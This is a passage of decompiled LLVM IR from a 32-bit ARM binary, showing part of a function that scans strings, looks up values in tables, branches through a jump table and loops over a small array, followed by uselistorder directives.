  br i1 %v2_13b70, label %bb150, label %bb149

bb149:                                            ; preds = %dec_label_pc_13b70
  %v2_13b74 = add i32 %v2_13b64, -2
  store i32 %v2_13b74, i32* %r1.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %dec_label_pc_13b5c, %dec_label_pc_13b70, %bb149
  %v0_13b7c = phi i32 [ %v2_13b64, %dec_label_pc_13b5c ], [ %v2_13b64, %dec_label_pc_13b70 ], [ %v2_13b74, %bb149 ]
  %v1_13b7c = load i32, i32* %r7.global-to-local, align 4
  %v2_13b7c = add i32 %v1_13b7c, 32
  %v3_13b7c = inttoptr i32 %v2_13b7c to i32*
  store i32 %v0_13b7c, i32* %v3_13b7c, align 4
  store i32 ptrtoint (i32* @global_var_22c78.731 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22c77.732 to i32), i32* %r0.global-to-local, align 4
  %v0_13b8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13b88

dec_label_pc_13b88:                               ; preds = %dec_label_pc_13b88, %bb150
  %v0_13b88 = phi i32 [ %v1_13b88, %dec_label_pc_13b88 ], [ ptrtoint (i32* @global_var_22c77.732 to i32), %bb150 ]
  %v1_13b88 = add i32 %v0_13b88, 1
  %v2_13b88 = inttoptr i32 %v1_13b88 to i8*
  %v3_13b88 = load i8, i8* %v2_13b88, align 1
  %v4_13b88 = zext i8 %v3_13b88 to i32
  store i32 %v4_13b88, i32* %r3.global-to-local, align 4
  store i32 %v1_13b88, i32* %r0.global-to-local, align 4
  %v8_13b90 = icmp sgt i32 %v0_13b8c.pre, %v4_13b88
  br i1 %v8_13b90, label %dec_label_pc_13b88, label %dec_label_pc_13b94

dec_label_pc_13b94:                               ; preds = %dec_label_pc_13b88
  %v2_13ba0 = sub i32 %v1_13b88, ptrtoint (i32* @global_var_22c78.731 to i32)
  %v2_13ba4 = mul i32 %v2_13ba0, 2
  store i32 %v2_13ba4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22c68.734 to i32), i32* %r3.global-to-local, align 4
  %v2_13bac = add i32 %v2_13ba4, ptrtoint (i32* @global_var_22c68.734 to i32)
  %v3_13bac = inttoptr i32 %v2_13bac to i16*
  %v4_13bac = load i16, i16* %v3_13bac, align 2
  %v6_13bac = sext i16 %v4_13bac to i32
  store i32 %v6_13bac, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22c58.736 to i32), i32* %r3.global-to-local, align 4
  %v2_13bb8 = add i32 %v2_13ba4, ptrtoint (i32* @global_var_22c58.736 to i32)
  %v3_13bb8 = inttoptr i32 %v2_13bb8 to i16*
  %v4_13bb8 = load i16, i16* %v3_13bb8, align 2
  %v6_13bb8 = sext i16 %v4_13bb8 to i32
  %v1_13bbc = load i32, i32* @ip, align 4
  %v2_13bbc = or i32 %v1_13bbc, %v6_13bac
  %v2_13bc0 = and i32 %v2_13bbc, %v6_13bb8
  store i32 %v2_13bc0, i32* %r1.global-to-local, align 4
  store i32 -37756, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_22ca8.729 to i32), i32* %r0.global-to-local, align 4
  store i32 %v2_13bc0, i32* %stack_var_-72, align 4
  %v0_13bec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13be0

dec_label_pc_13bd4:                               ; preds = %dec_label_pc_13b50
  %v1_13bd4 = add i32 %v1_13b64, 1
  %v2_13bd4 = inttoptr i32 %v1_13bd4 to i8*
  %v3_13bd4 = load i8, i8* %v2_13bd4, align 1
  %v4_13bd4 = zext i8 %v3_13bd4 to i32
  store i32 %v4_13bd4, i32* %r3.global-to-local, align 4
  store i32 %v1_13bd4, i32* %r0.global-to-local, align 4
  %v2_13bd8 = icmp eq i8 %v3_13bd4, 0
  br i1 %v2_13bd8, label %dec_label_pc_13be0, label %dec_label_pc_13b50

dec_label_pc_13be0:                               ; preds = %dec_label_pc_13bd4, %dec_label_pc_13b94
  %v0_13bec = phi i32 [ %v0_13bec.pre, %dec_label_pc_13b94 ], [ %v0_13b34, %dec_label_pc_13bd4 ]
  %v0_13be8 = phi i32 [ %v1_13bbc, %dec_label_pc_13b94 ], [ %v3_13b40, %dec_label_pc_13bd4 ]
  %v0_13be0 = load i32, i32* @r4, align 4
  %v1_13be0 = and i32 %v0_13be0, 4
  %v1_13be4 = and i32 %v0_13be0, -5
  store i32 %v1_13be4, i32* %r3.global-to-local, align 4
  %v1_13be8 = and i32 %v0_13be8, 3840
  store i32 %v1_13be8, i32* %r2.global-to-local, align 4
  %v1_13bec = inttoptr i32 %v0_13bec to i8*
  %v2_13bec = load i8, i8* %v1_13bec, align 1
  %v3_13bec = zext i8 %v2_13bec to i32
  store i32 %v3_13bec, i32* %r1.global-to-local, align 4
  %v2_13bf0 = or i32 %v1_13be4, %v1_13be8
  store i32 %v2_13bf0, i32* %r2.global-to-local, align 4
  %tmp178 = mul nuw nsw i32 %v1_13be0, 4
  %tmp179 = or i32 %tmp178, 32
  %v1_13bfc = load i32, i32* %r7.global-to-local, align 4
  %v2_13bfc = add i32 %v1_13bfc, 20
  %v3_13bfc = inttoptr i32 %v2_13bfc to i32*
  store i32 %tmp179, i32* %v3_13bfc, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_13c04 = load i32, i32* %r1.global-to-local, align 4
  %v1_13c04 = load i32, i32* %r7.global-to-local, align 4
  %v2_13c04 = add i32 %v1_13c04, 12
  %v3_13c04 = inttoptr i32 %v2_13c04 to i32*
  store i32 %v0_13c04, i32* %v3_13c04, align 4
  %v0_13c08 = load i32, i32* %r7.global-to-local, align 4
  %v1_13c08 = add i32 %v0_13c08, 4
  %v2_13c08 = inttoptr i32 %v1_13c08 to i32*
  %v3_13c08 = load i32, i32* @r5, align 4
  store i32 %v3_13c08, i32* %v2_13c08, align 4
  %v4_13c08 = add i32 %v0_13c08, 8
  %v5_13c08 = inttoptr i32 %v4_13c08 to i32*
  %v6_13c08 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_13c08, i32* %v5_13c08, align 4
  %v0_13c0c = load i32, i32* %r2.global-to-local, align 4
  %v1_13c0c = load i32, i32* %r7.global-to-local, align 4
  %v2_13c0c = add i32 %v1_13c0c, 16
  %v3_13c0c = inttoptr i32 %v2_13c0c to i32*
  store i32 %v0_13c0c, i32* %v3_13c0c, align 4
  %v0_13c10 = load i32, i32* %r3.global-to-local, align 4
  %v1_13c10 = load i32, i32* %r7.global-to-local, align 4
  %v2_13c10 = add i32 %v1_13c10, 28
  %v3_13c10 = inttoptr i32 %v2_13c10 to i32*
  store i32 %v0_13c10, i32* %v3_13c10, align 4
  %v0_13c14 = load i32, i32* %r0.global-to-local, align 4
  %v1_13c14 = inttoptr i32 %v0_13c14 to i8*
  %v2_13c14 = load i8, i8* %v1_13c14, align 1
  %v3_13c14 = zext i8 %v2_13c14 to i32
  store i32 %v3_13c14, i32* %r2.global-to-local, align 4
  %v2_13c18 = icmp eq i8 %v2_13c14, 0
  br i1 %v2_13c18, label %dec_label_pc_13c20, label %dec_label_pc_13ca4

dec_label_pc_13c20:                               ; preds = %dec_label_pc_13be0
  %v0_13c20 = load i32, i32* %r6.global-to-local, align 4
  %v1_13c20 = inttoptr i32 %v0_13c20 to i8*
  %v2_13c20 = load i8, i8* %v1_13c20, align 1
  %v3_13c20 = zext i8 %v2_13c20 to i32
  store i32 %v3_13c20, i32* %r3.global-to-local, align 4
  %v7_13c24 = icmp eq i8 %v2_13c20, 109
  br i1 %v7_13c24, label %.thread27, label %dec_label_pc_13c38

.thread27:                                        ; preds = %dec_label_pc_13c20
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_13c2c = load i32, i32* %r7.global-to-local, align 4
  %v3_13c2c = add i32 %v2_13c2c, 32
  %v4_13c2c = inttoptr i32 %v3_13c2c to i32*
  store i32 20, i32* %v4_13c2c, align 4
  %v1_13c30 = load i32, i32* %r2.global-to-local, align 4
  %v2_13c30 = load i32, i32* %r7.global-to-local, align 4
  %v3_13c30 = add i32 %v2_13c30, 28
  %v4_13c30 = inttoptr i32 %v3_13c30 to i32*
  store i32 %v1_13c30, i32* %v4_13c30, align 4
  br label %dec_label_pc_13ca4

dec_label_pc_13c38:                               ; preds = %dec_label_pc_13c20
  store i32 1852, i32* %r3.global-to-local, align 4
  %v0_13c3c = load i32, i32* @lr, align 4
  %v2_13c3c = add i32 %v0_13c3c, 1852
  %v3_13c3c = inttoptr i32 %v2_13c3c to i32*
  %v4_13c3c = load i32, i32* %v3_13c3c, align 4
  store i32 %v4_13c3c, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_13c44 = load i32, i32* %r7.global-to-local, align 4
  %v2_13c44 = add i32 %v1_13c44, 32
  %v3_13c44 = inttoptr i32 %v2_13c44 to i32*
  store i32 21, i32* %v3_13c44, align 4
  %v0_13c48 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13c48, i32* @ip, align 4
  %v1_13c4c = add i32 %v0_13c48, 10
  store i32 %v1_13c4c, i32* %r0.global-to-local, align 4
  %v0_13c54.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_13c54 = inttoptr i32 %v0_13c54.pre to i8*
  br label %dec_label_pc_13c50

dec_label_pc_13c50:                               ; preds = %dec_label_pc_13c94, %dec_label_pc_13c38
  %v1_13c60 = phi i32 [ %v1_13c94, %dec_label_pc_13c94 ], [ %v0_13c48, %dec_label_pc_13c38 ]
  %v1_13c50 = inttoptr i32 %v1_13c60 to i8*
  %v2_13c50 = load i8, i8* %v1_13c50, align 1
  %v3_13c50 = zext i8 %v2_13c50 to i32
  store i32 %v3_13c50, i32* %r2.global-to-local, align 4
  %v2_13c54 = load i8, i8* %v1_13c54, align 1
  %v3_13c54 = zext i8 %v2_13c54 to i32
  store i32 %v3_13c54, i32* %r3.global-to-local, align 4
  %v9_13c58 = icmp eq i8 %v2_13c50, %v2_13c54
  br i1 %v9_13c58, label %dec_label_pc_13c60, label %dec_label_pc_13c94

dec_label_pc_13c60:                               ; preds = %dec_label_pc_13c50
  %v2_13c60 = sub i32 %v1_13c60, %v0_13c48
  store i32 %v2_13c60, i32* %r3.global-to-local, align 4
  %v0_13c68 = load i32, i32* %r7.global-to-local, align 4
  %v1_13c68 = add i32 %v0_13c68, 4
  store i32 %v1_13c68, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_13c74 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_13c74, i32* %r2.global-to-local, align 4
  %v4_13c78 = mul i32 %v2_13c60, 4
  %v5_13c78 = add i32 %v4_13c78, ptrtoint (i32* @global_var_32afc.739 to i32)
  %v6_13c78 = inttoptr i32 %v5_13c78 to i32*
  %v7_13c78 = load i32, i32* %v6_13c78, align 4
  store i32 %v7_13c78, i32* @ip, align 4
  store i32 81028, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_13c78)
  %v0_13c84 = load i32, i32* %r0.global-to-local, align 4
  %v1_13c88 = load i32, i32* %r7.global-to-local, align 4
  %v2_13c88 = add i32 %v1_13c88, 28
  %v3_13c88 = inttoptr i32 %v2_13c88 to i32*
  store i32 %v0_13c84, i32* %v3_13c88, align 4
  %v7_13c8c = icmp sgt i32 %v0_13c84, 5
  br i1 %v7_13c8c, label %dec_label_pc_13da0, label %dec_label_pc_13ca4

dec_label_pc_13c94:                               ; preds = %dec_label_pc_13c50
  %v1_13c94 = add i32 %v1_13c60, 1
  store i32 %v1_13c94, i32* %r1.global-to-local, align 4
  %v3_13c98 = icmp ult i32 %v1_13c94, %v1_13c4c
  br i1 %v3_13c98, label %dec_label_pc_13c50, label %dec_label_pc_13da0

dec_label_pc_13ca4:                               ; preds = %.thread27, %dec_label_pc_13c60, %dec_label_pc_13be0
  %v0_13ca4 = load i32, i32* %fp.global-to-local, align 4
  %tmp154 = icmp slt i32 %v0_13ca4, 1
  br i1 %tmp154, label %dec_label_pc_13d50, label %dec_label_pc_13cac

dec_label_pc_13cac:                               ; preds = %dec_label_pc_13ca4
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_13cc4 = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_13cb0

dec_label_pc_13cb0:                               ; preds = %dec_label_pc_13d38, %dec_label_pc_13cac
  %v9_13cd0 = phi i32 [ 0, %dec_label_pc_13cac ], [ %v1_13d3c, %dec_label_pc_13d38 ]
  %v7_13cb4 = icmp sgt i32 %v9_13cd0, 2
  br i1 %v7_13cb4, label %.thread37, label %bb155

.thread37:                                        ; preds = %dec_label_pc_13cb0
  store i32 %v9_13cc4, i32* %r3.global-to-local, align 4
  %v10_13cd0 = add i32 %v9_13cd0, %v9_13cc4
  store i32 %v10_13cd0, i32* %r1.global-to-local, align 4
  br label %bb156

bb155:                                            ; preds = %dec_label_pc_13cb0
  store i32 %v3_1392c.pre-phi, i32* @ip, align 4
  %v12_13cb8 = mul i32 %v9_13cd0, 4
  %v13_13cb8 = add i32 %v12_13cb8, %v3_1392c.pre-phi
  store i32 %v13_13cb8, i32* %r3.global-to-local, align 4
  %v9_13cc0 = add i32 %v13_13cb8, -12
  %v10_13cc0 = inttoptr i32 %v9_13cc0 to i8*
  %v11_13cc0 = load i8, i8* %v10_13cc0, align 4
  %v12_13cc0 = zext i8 %v11_13cc0 to i32
  store i32 %v12_13cc0, i32* %r2.global-to-local, align 4
  %v9_13cc8 = load i32, i32* %r7.global-to-local, align 4
  %v10_13cc8 = add i32 %v9_13cc8, %v9_13cd0
  store i32 %v10_13cc8, i32* %r3.global-to-local, align 4
  store i32 %v12_13cc0, i32* %r1.global-to-local, align 4
  %v11_13cd4 = add i32 %v10_13cc8, 36
  %v12_13cd4 = inttoptr i32 %v11_13cd4 to i8*
  store i8 %v11_13cc0, i8* %v12_13cd4, align 1
  %v0_13cd8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %.thread37, %bb155
  %v0_13cf8 = phi i32 [ %v10_13cd0, %.thread37 ], [ %v0_13cd8.pre, %bb155 ]
  %v1_13cd8 = load i32, i32* %fp.global-to-local, align 4
  %v2_13cd8 = sub i32 %v0_13cf8, %v1_13cd8
  %v4_13cd8 = xor i32 %v1_13cd8, %v0_13cf8
  %v5_13cd8 = xor i32 %v2_13cd8, %v0_13cf8
  %v6_13cd8 = and i32 %v5_13cd8, %v4_13cd8
  %v7_13cd8 = icmp slt i32 %v6_13cd8, 0
  %v8_13cd8 = icmp slt i32 %v2_13cd8, 0
  %v9_13cd8 = icmp eq i32 %v0_13cf8, %v1_13cd8
  %v3_13cdc = xor i1 %v8_13cd8, %v7_13cd8
  %v4_13cdc = or i1 %v9_13cd8, %v3_13cdc
  br i1 %v4_13cdc, label %dec_label_pc_13cec, label %dec_label_pc_13ce0

dec_label_pc_13ce0:                               ; preds = %bb156
  %v1_13ce0 = add i32 %v0_13cf8, -9
  %v3_13ce0 = sub i32 8, %v0_13cf8
  %v4_13ce0 = and i32 %v3_13ce0, %v0_13cf8
  %v5_13ce0 = icmp slt i32 %v4_13ce0, 0
  %v6_13ce0 = icmp slt i32 %v1_13ce0, 0
  %v7_13ce0 = icmp eq i32 %v0_13cf8, 9
  %v3_13ce4 = xor i1 %v6_13ce0, %v5_13ce0
  %v4_13ce4 = or i1 %v7_13ce0, %v3_13ce4
  br i1 %v4_13ce4, label %dec_label_pc_13ce8, label %dec_label_pc_13da0

dec_label_pc_13ce8:                               ; preds = %dec_label_pc_13ce0
  store i32 %v0_13cf8, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_13cec

dec_label_pc_13cec:                               ; preds = %bb156, %dec_label_pc_13ce8
  store i32 %v3_1392c.pre-phi, i32* @r2, align 4
  %v1_13cf0 = load i32, i32* %r8.global-to-local, align 4
  %v4_13cf0 = mul i32 %v1_13cf0, 4
  %v5_13cf0 = add i32 %v4_13cf0, %v3_1392c.pre-phi
  store i32 %v5_13cf0, i32* %sb.global-to-local, align 4
  %v1_13cf4 = add i32 %v5_13cf0, -40
  %v2_13cf4 = inttoptr i32 %v1_13cf4 to i32*
  %v3_13cf4 = load i32, i32* %v2_13cf4, align 4
  store i32 %v3_13cf4, i32* %r5.global-to-local, align 4
  %v1_13cf8 = add i32 %v0_13cf8, -1
  store i32 %v1_13cf8, i32* %r3.global-to-local, align 4
  %v0_13cfc = load i32, i32* %r7.global-to-local, align 4
  %v4_13cfc = mul i32 %v1_13cf8, 4
  %v5_13cfc = add i32 %v0_13cfc, %v4_13cfc
  store i32 %v5_13cfc, i32* %sl.global-to-local, align 4
  %v7_13d00 = icmp eq i32 %v3_13cf4, 8
  %v1_13d04 = add i32 %v5_13cfc, 40
  %v2_13d04 = inttoptr i32 %v1_13d04 to i32*
  %v3_13d04 = load i32, i32* %v2_13d04, align 4
  store i32 %v3_13d04, i32* @r0, align 4
  br i1 %v7_13d00, label %dec_label_pc_13d38, label %dec_label_pc_13d0c

dec_label_pc_13d0c:                               ; preds = %dec_label_pc_13cec
  %v9_13d0c = icmp eq i32 %v3_13d04, %v3_13cf4
  br i1 %v9_13d0c, label %dec_label_pc_13d30, label %bb157

bb157:                                            ; preds = %dec_label_pc_13d0c
  %v8_13d10 = icmp eq i32 %v3_13d04, 8
  br i1 %v8_13d10, label %dec_label_pc_13d30, label %dec_label_pc_13d18

dec_label_pc_13d18:                               ; preds = %bb157
  %v0_13d18 = call i32 @function_1381c()
  %v0_13d20 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13d20, i32* @r0, align 4
  %v0_13d24 = call i32 @function_1381c()
  store i32 %v0_13d24, i32* %r0.global-to-local, align 4
  %v8_13d2c = icmp sgt i32 %v0_13d18, %v0_13d24
  br i1 %v8_13d2c, label %dec_label_pc_13d38, label %dec_label_pc_13d18.dec_label_pc_13d30_crit_edge

dec_label_pc_13d18.dec_label_pc_13d30_crit_edge:  ; preds = %dec_label_pc_13d18
  %v0_13d30.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_13d34.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13d30

dec_label_pc_13d30:                               ; preds = %dec_label_pc_13d18.dec_label_pc_13d30_crit_edge, %dec_label_pc_13d0c, %bb157
  %v1_13d34 = phi i32 [ %v1_13d34.pre, %dec_label_pc_13d18.dec_label_pc_13d30_crit_edge ], [ %v5_13cfc, %dec_label_pc_13d0c ], [ %v5_13cfc, %bb157 ]
  %v0_13d30 = phi i32 [ %v0_13d30.pre, %dec_label_pc_13d18.dec_label_pc_13d30_crit_edge ], [ %v5_13cf0, %dec_label_pc_13d0c ], [ %v5_13cf0, %bb157 ]
  %v1_13d30 = add i32 %v0_13d30, -40
  %v2_13d30 = inttoptr i32 %v1_13d30 to i32*
  %v3_13d30 = load i32, i32* %v2_13d30, align 4
  store i32 %v3_13d30, i32* %r3.global-to-local, align 4
  %v2_13d34 = add i32 %v1_13d34, 40
  %v3_13d34 = inttoptr i32 %v2_13d34 to i32*
  store i32 %v3_13d30, i32* %v3_13d34, align 4
  br label %dec_label_pc_13d38

dec_label_pc_13d38:                               ; preds = %dec_label_pc_13d18, %dec_label_pc_13cec, %dec_label_pc_13d30
  %v0_13d38 = load i32, i32* %r7.global-to-local, align 4
  %v1_13d38 = add i32 %v0_13d38, 28
  %v2_13d38 = inttoptr i32 %v1_13d38 to i32*
  %v3_13d38 = load i32, i32* %v2_13d38, align 4
  %v0_13d3c = load i32, i32* %r8.global-to-local, align 4
  %v1_13d3c = add i32 %v0_13d3c, 1
  store i32 %v1_13d3c, i32* %r8.global-to-local, align 4
  %v1_13d40 = add i32 %v3_13d38, 2
  store i32 %v1_13d40, i32* %r3.global-to-local, align 4
  %v6_13d48 = icmp slt i32 %v1_13d3c, %v1_13d40
  br i1 %v6_13d48, label %dec_label_pc_13cb0, label %dec_label_pc_13d6c

dec_label_pc_13d50:                               ; preds = %dec_label_pc_13ca4
  %v0_13d50 = load i32, i32* %r7.global-to-local, align 4
  %v1_13d50 = add i32 %v0_13d50, 28
  %v2_13d50 = inttoptr i32 %v1_13d50 to i32*
  %v3_13d50 = load i32, i32* %v2_13d50, align 4
  store i32 %v3_13d50, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_13d58 = add i32 %v0_13d50, 38
  %v4_13d58 = inttoptr i32 %v3_13d58 to i8*
  store i8 1, i8* %v4_13d58, align 1
  %v0_13d5c = load i32, i32* %r2.global-to-local, align 4
  %v3_13d5c = mul i32 %v0_13d5c, 4
  store i32 %v3_13d5c, i32* @r2, align 4
  %v0_13d60 = load i32, i32* %r7.global-to-local, align 4
  %v1_13d60 = add i32 %v0_13d60, 40
  store i32 %v1_13d60, i32* @r0, align 4
  %v2_13d64 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_13d64, i32* @r1, align 4
  %v0_13d68 = call i32 @function_14000()
  store i32 %v0_13d68, i32* %r0.global-to-local, align 4
  %v0_13d6c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13d6c

dec_label_pc_13d6c:                               ; preds = %dec_label_pc_13d38, %dec_label_pc_13d50
  %v2_13d88 = phi i32 [ %v0_13d6c.pre, %dec_label_pc_13d50 ], [ %v0_13d38, %dec_label_pc_13d38 ]
  %v1_13d6c = add i32 %v2_13d88, 16
  %v2_13d6c = inttoptr i32 %v1_13d6c to i32*
  %v3_13d6c = load i32, i32* %v2_13d6c, align 4
  store i32 %v3_13d6c, i32* %r3.global-to-local, align 4
  %v1_13d70 = and i32 %v3_13d6c, 128
  %v2_13d70 = icmp eq i32 %v1_13d70, 0
  br i1 %v2_13d70, label %.thread49, label %.thread47

.thread47:                                        ; preds = %dec_label_pc_13d6c
  %v3_13d74 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_13d74, i32* %r3.global-to-local, align 4
  %v2_13d78 = inttoptr i32 %v2_13d88 to i32*
  %v3_13d78 = load i32, i32* %v2_13d78, align 4
  %v2_13d80.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_13d80 = sub i32 %v2_13d80.pre, %v3_13d74
  store i32 %v3_13d80, i32* %r3.global-to-local, align 4
  %v5_13d84 = mul i32 %v3_13d80, 4
  %v6_13d84 = add i32 %v5_13d84, %v3_13d78
  store i32 %v6_13d84, i32* @r2, align 4
  br label %bb158

.thread49:                                        ; preds = %dec_label_pc_13d6c
  %v1_13d7c44 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d7c45 = add i32 %v1_13d7c44, 1
  store i32 %v2_13d7c45, i32* %r3.global-to-local, align 4
  %v3_13d88 = inttoptr i32 %v2_13d88 to i32*
  store i32 %v2_13d7c45, i32* %v3_13d88, align 4
  %v0_13d8c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread47, %.thread49
  %v1_13d94 = phi i32 [ %v2_13d88, %.thread47 ], [ %v0_13d8c.pre, %.thread49 ]
  %v1_13d8c = add i32 %v1_13d94, 28
  %v2_13d8c = inttoptr i32 %v1_13d8c to i32*
  %v3_13d8c = load i32, i32* %v2_13d8c, align 4
  store i32 %v3_13d8c, i32* %r3.global-to-local, align 4
  %v1_13d90 = add i32 %v3_13d8c, 2
  store i32 %v1_13d90, i32* %r0.global-to-local, align 4
  %v0_13d94 = load i32, i32* %fp.global-to-local, align 4
  %v2_13d94 = add i32 %v1_13d94, 24
  %v3_13d94 = inttoptr i32 %v2_13d94 to i32*
  store i32 %v0_13d94, i32* %v3_13d94, align 4
  br i1 %v2_13d70, label %dec_label_pc_13da4, label %bb159

bb159:                                            ; preds = %bb158
  %v1_13d98 = load i32, i32* @r2, align 4
  %v2_13d98 = load i32, i32* %r7.global-to-local, align 4
  %v3_13d98 = inttoptr i32 %v2_13d98 to i32*
  store i32 %v1_13d98, i32* %v3_13d98, align 4
  br label %dec_label_pc_13da4

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13c94, %dec_label_pc_138b4, %dec_label_pc_139fc, %dec_label_pc_13aa8, %dec_label_pc_13a80, %dec_label_pc_13a8c, %dec_label_pc_139c8, %dec_label_pc_13ce0, %dec_label_pc_13c60, %.thread23
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13da4

dec_label_pc_13da4:                               ; preds = %bb159, %bb158, %dec_label_pc_13da0
  %v2_13da8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13da8, i32* @r4, align 4
  store i32 %v6_13870, i32* @r5, align 4
  store i32 %v27_13870, i32* @lr, align 4
  %v1_13dac = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13dac

; uselistorder directives
  uselistorder i32 %v3_13d80, { 1, 0 }
  uselistorder i32 %v1_13d3c, { 1, 2, 0 }
  uselistorder i32 %v2_13cd8, { 1, 0 }
  uselistorder i32 %v1_13cd8, { 1, 0, 2 }
  uselistorder i32 %v0_13cf8, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_13cd0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_13c94, { 1, 2, 0 }
  uselistorder i32 %v0_13c84, { 1, 0 }
  uselistorder i32 %v1_13c60, { 1, 0, 2 }
  uselistorder i32 %v1_13bd4, { 1, 2, 0 }
  uselistorder i32 %v1_13bbc, { 1, 0 }
  uselistorder i32 %v2_13ba4, { 2, 1, 0 }
  uselistorder i32 %v1_13b88, { 0, 2, 3, 1 }
  uselistorder i32 %v1_13b64, { 1, 0, 2 }
  uselistorder i32 %v3_13b40, { 2, 1, 0 }
  uselistorder i32 %v1_13b00, { 0, 2, 3, 1 }
  uselistorder i32 %v0_13af0.pre, { 0, 2, 1 }
  uselistorder i32 %v2_13acc, { 1, 0 }
  uselistorder i32 %v5_13a2c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13a2c, { 1, 0 }
  uselistorder i32 %v0_13a3074, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_139d4, { 1, 0 }
  uselistorder i32 %v0_139f4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_139b8, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_139a0, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_13990, { 1, 0 }
  uselistorder i32 %v3_13988, { 0, 2, 1 }
  uselistorder i8 %v2_13988, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13a08, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_1394c, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_13938, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13920, { 1, 0 }
  uselistorder i32 %v3_1392c.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_138d4, { 0, 2, 1 }
  uselistorder i32 %v2_138c0, { 1, 0, 2 }
  uselistorder i32 %v0_13874, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 3, 1, 0, 4, 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20 }
  uselistorder i32* %r6.global-to-local, { 15, 11, 12, 13, 9, 2, 3, 10, 4, 14, 5, 6, 7, 8, 0, 1, 16 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 50, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 18, 45, 48, 49, 46, 47, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 38, { 2, 0, 1 }
  uselistorder i32 ()* @function_1381c, { 1, 0 }
  uselistorder i32 21, { 0, 2, 1 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_22ca8.729 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_22c44.727 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_13da4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13da0, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_13d6c, { 1, 0 }
  uselistorder label %dec_label_pc_13d38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13d30, { 0, 2, 1 }
